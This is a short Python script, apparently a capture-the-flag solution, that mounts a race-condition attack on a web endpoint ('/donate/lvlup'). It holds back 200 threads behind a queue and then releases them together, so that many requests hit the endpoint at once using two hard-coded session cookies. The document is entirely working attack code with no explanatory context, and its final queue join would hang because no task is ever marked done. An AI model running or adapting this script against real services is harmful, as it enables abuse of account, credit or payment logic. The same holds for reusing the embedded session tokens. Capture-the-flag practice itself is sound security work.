import threading
import requests
from Queue import Queue

max = 100
threads = Queue()

def lvlup(cookie):
    threads.get()
    url = "http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup"
    r = requests.get(url, cookies={"session": cookie})


def worker2(index):
    lvlup("eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE")       # chrome


def worker(index):
    lvlup("eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0")         # firefox


def race():
    for i in range(max):
        thread = threading.Thread(target=worker, args=[i])
        thread.start()
    for i in range(max):
        thread = threading.Thread(target=worker2, args=[i])
        thread.start()
    for i in range(max * 2):
        threads.put(i)
    threads.join()


race()